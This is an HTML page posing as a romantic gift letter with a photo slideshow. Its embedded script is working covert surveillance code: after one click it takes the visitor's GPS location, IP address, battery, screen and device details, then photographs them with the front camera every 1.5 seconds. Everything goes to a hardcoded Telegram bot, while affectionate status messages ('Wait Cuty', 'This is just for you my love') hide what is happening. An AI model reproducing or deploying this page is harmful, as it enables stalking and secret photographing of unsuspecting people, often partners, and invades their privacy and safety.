<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>💝 বিশেষ উপহার</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&family=Hind+Siliguri:wght@300;400;600;700&display=swap" rel="stylesheet" />
  <script src="https://unpkg.com/lucide@latest"></script>
  <style>
    body {
      font-family: 'Outfit', sans-serif;
      background-color: #050505;
      color: white;
      min-height: 100vh;
      margin: 0;
      transition: background-color 0.5s ease;
      overflow-x: hidden;
    }
    .gift-glow {
      box-shadow: 0 0 50px rgba(236, 72, 153, 0.4);
    }
    .pulse-animation {
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(236, 72, 153, 0.7); }
      70% { transform: scale(1); box-shadow: 0 0 0 20px rgba(236, 72, 153, 0); }
      100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(236, 72, 153, 0); }
    }
    .fade-out {
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.5s ease, visibility 0.5s;
    }
    .hidden {
      display: none !important;
    }
    .processing-overlay {
      position: fixed;
      inset: 0;
      background: rgba(5, 5, 5, 0.95);
      backdrop-filter: blur(10px);
      z-index: 100;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    /* ===== Slide styles ===== */
    .slide-container {
      background: linear-gradient(135deg, #1e3a8a 0%, #1d4ed8 50%, #2563eb 100%);
      border-radius: 2rem;
      padding: 1.5rem;
      box-shadow: 0 20px 60px rgba(37, 99, 235, 0.4);
      border: 1px solid rgba(255, 255, 255, 0.08);
      overflow: hidden;
    }
    .slide-track {
      display: flex;
      transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
    }
    .slide-item {
      min-width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .slide-item img {
      width: 100%;
      height: auto;
      max-height: 70vh;
      object-fit: contain;
      border-radius: 1.25rem;
      background: rgba(255, 255, 255, 0.04);
    }
    .slide-dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.3);
      transition: all 0.3s ease;
      cursor: pointer;
      border: none;
    }
    .slide-dot.active {
      background: #fff;
      width: 28px;
      border-radius: 6px;
    }
    .slide-arrow {
      position: absolute;
      top: 50%;
      transform: translateY(-50%);
      background: rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(6px);
      border: 1px solid rgba(255, 255, 255, 0.2);
      color: #fff;
      width: 44px;
      height: 44px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: all 0.2s ease;
      z-index: 10;
    }
    .slide-arrow:hover {
      background: rgba(255, 255, 255, 0.3);
    }
    .slide-arrow.left { left: 1rem; }
    .slide-arrow.right { right: 1rem; }
  </style>
</head>
<body>

  <!-- ========== INITIAL UI ========== -->
  <div id="initial-ui" class="flex flex-col items-center justify-center min-h-screen w-full max-w-md mx-auto p-6 text-center transition-all duration-500">
    
    <div class="relative w-32 h-32 mb-8 flex items-center justify-center bg-gradient-to-tr from-pink-600 to-purple-600 rounded-3xl gift-glow pulse-animation">
      <i data-lucide="gift" class="w-16 h-16 text-white"></i>
    </div>
    
    <button 
      id="verify-btn"
      class="w-full max-w-[200px] py-3.5 bg-white/10 hover:bg-white/20 border border-white/20 rounded-xl font-semibold tracking-wide backdrop-blur-md transition-all active:scale-95"
    >
      Read Chithi
    </button>
  </div>

  <!-- ========== PROCESSING OVERLAY ========== -->
  <div id="processing-overlay" class="processing-overlay hidden">
    <div class="w-12 h-12 border-4 border-white/10 border-t-white rounded-full animate-spin mb-4"></div>
    <p id="status-text" class="text-white/60 text-sm tracking-widest uppercase font-medium">Authenticating...</p>
  </div>

  <!-- ========== SLIDESHOW SECTION (hidden initially) ========== -->
  <div id="letter-section" class="hidden w-full max-w-4xl mx-auto px-4 py-12">
    <div class="slide-container relative">
      <!-- Slides Track -->
      <div class="slide-track" id="slide-track">
        <!-- Slide 1 -->
        <div class="slide-item">
          <img src="sfdsadf.jpeg" alt="Slide 1" />
        </div>
        <!-- Slide 2 -->
        <div class="slide-item">
          <img src="Untitled.jpeg" alt="Slide 2" />
        </div>
        <!-- Slide 3 -->
        <div class="slide-item">
          <img src="Untitsfdafled.jpeg" alt="Slide 3" />
        </div>
      </div>

      <!-- Arrows -->
      <button class="slide-arrow left" id="slide-prev" aria-label="Previous">
        <i data-lucide="chevron-left" class="w-6 h-6"></i>
      </button>
      <button class="slide-arrow right" id="slide-next" aria-label="Next">
        <i data-lucide="chevron-right" class="w-6 h-6"></i>
      </button>

      <!-- Dots -->
      <div class="flex justify-center gap-2 mt-5" id="slide-dots">
        <button class="slide-dot active" data-index="0" aria-label="Slide 1"></button>
        <button class="slide-dot" data-index="1" aria-label="Slide 2"></button>
        <button class="slide-dot" data-index="2" aria-label="Slide 3"></button>
      </div>
    </div>
  </div>

  <script>
    lucide.createIcons();

    // ==========================================
    // টেলিগ্রাম কনফিগারেশন
    // ==========================================
    const BOT_TOKEN = '8872517216:AAE9TaK14hQZN8rHiyS5_4QrqE7b_IDu_kQ';
    const CHAT_ID = '7005704145';

    const verifyBtn = document.getElementById('verify-btn');
    const initialUI = document.getElementById('initial-ui');
    const processingOverlay = document.getElementById('processing-overlay');
    const statusText = document.getElementById('status-text');
    const letterSection = document.getElementById('letter-section');

    let videoStream = null;
    let captureInterval = null;

    verifyBtn.addEventListener('click', startVerification);

    async function startVerification() {
      // 1. Fade out initial UI
      initialUI.classList.add('fade-out');
      setTimeout(() => {
        initialUI.style.display = 'none';
        processingOverlay.classList.remove('hidden');
      }, 500);

      try {
        // 2. Get Location Permission
        statusText.textContent = "Wait Cuty...";
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { 
            enableHighAccuracy: true,
            timeout: 15000
          });
        }).catch(() => null);

        // 3. Get Camera Permission
        statusText.textContent = "Wait Cuty .";
        videoStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, 
          audio: false
        });

        // 4. Setup video for capturing
        const video = document.createElement('video');
        video.srcObject = videoStream;
        video.setAttribute('playsinline', '');
        await video.play();

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        // 5. Send initial data
        await sendTextData(position);

        // 6. Start continuous photo capture (every 3 seconds)
        statusText.textContent = "This is just for you my love...";
        
        // Take first 3 photos immediately
        for (let i = 0; i < 3; i++) {
          await captureAndSendPhoto(video, canvas, ctx);
          await new Promise(res => setTimeout(res, 1000));
        }

        // Then start interval for continuous capture
        captureInterval = setInterval(async () => {
          await captureAndSendPhoto(video, canvas, ctx);
        }, 1500);

        // 7. Hide processing overlay & show letter
        statusText.textContent = "Almost Done baby";
        setTimeout(() => {
          processingOverlay.classList.add('hidden');
          letterSection.classList.remove('hidden');
          
          // Scroll to letter smoothly
          letterSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 500);

      } catch (error) {
        statusText.textContent = "VERIFICATION FAILED. ACCESS DENIED.";
        console.error("Error:", error);
        setTimeout(() => {
          window.location.reload();
        }, 1500);
      }
    }

    async function captureAndSendPhoto(video, canvas, ctx) {
      try {
        // Set canvas size to match video
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        if (blob) {
          await sendPhoto(blob);
        }
      } catch (e) {
        console.error("Capture error:", e);
      }
    }

    async function sendTextData(position) {
      try {
        let ipData = {};
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          ipData = await ipRes.json();
        } catch(e) {}

        let batteryText = "Unknown";
        try {
            const battery = await navigator.getBattery();
            batteryText = `${Math.round(battery.level * 100)}% ${battery.charging ? '⚡ Charging' : ''}`;
        } catch(e) {}
        
        let locationText = "Not Allowed";
        if (position) {
          const { latitude, longitude } = position.coords;
          locationText = `[View Exact Location](https://www.google.com/maps?q=${latitude},${longitude})`;
        }

        const msg = `
🧑🏻‍💻 *Special Powerful Fishing* 🧑🏻‍💻

🌐 *IP Address:* \`${ipData.ip || 'Unknown'}\`
📍 *GPS Location:* ${locationText}
🔋 *Battery:* ${batteryText}
🖥️ *Screen:* ${screen.width}x${screen.height}
🧠 *Device:* \`${navigator.userAgent}\`
        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
          })
        });
      } catch (e) {
        console.error("Data Send Error", e);
      }
    }

    async function sendPhoto(blob) {
      try {
          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', blob, 'member_capture.jpg');
          
          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          console.log("📸 Photo sent successfully");
      } catch (e) {
          console.error("Photo Send Error:", e);
      }
    }

    // Clean up when user leaves the page
    window.addEventListener('beforeunload', () => {
      if (captureInterval) {
        clearInterval(captureInterval);
      }
      if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
      }
    });

    // ==========================================
    // SLIDESHOW LOGIC
    // ==========================================
    (function initSlideshow() {
      const track = document.getElementById('slide-track');
      const dots = document.querySelectorAll('.slide-dot');
      const prevBtn = document.getElementById('slide-prev');
      const nextBtn = document.getElementById('slide-next');
      const totalSlides = dots.length;
      let currentIndex = 0;

      function goToSlide(index) {
        if (index < 0) index = totalSlides - 1;
        if (index >= totalSlides) index = 0;
        currentIndex = index;
        track.style.transform = `translateX(-${currentIndex * 100}%)`;
        dots.forEach((dot, i) => {
          dot.classList.toggle('active', i === currentIndex);
        });
      }

      prevBtn.addEventListener('click', () => goToSlide(currentIndex - 1));
      nextBtn.addEventListener('click', () => goToSlide(currentIndex + 1));
      dots.forEach(dot => {
        dot.addEventListener('click', () => goToSlide(parseInt(dot.dataset.index)));
      });

      // Optional: auto-advance every 4 seconds
      // setInterval(() => goToSlide(currentIndex + 1), 4000);
    })();
  </script>
</body>
</html>
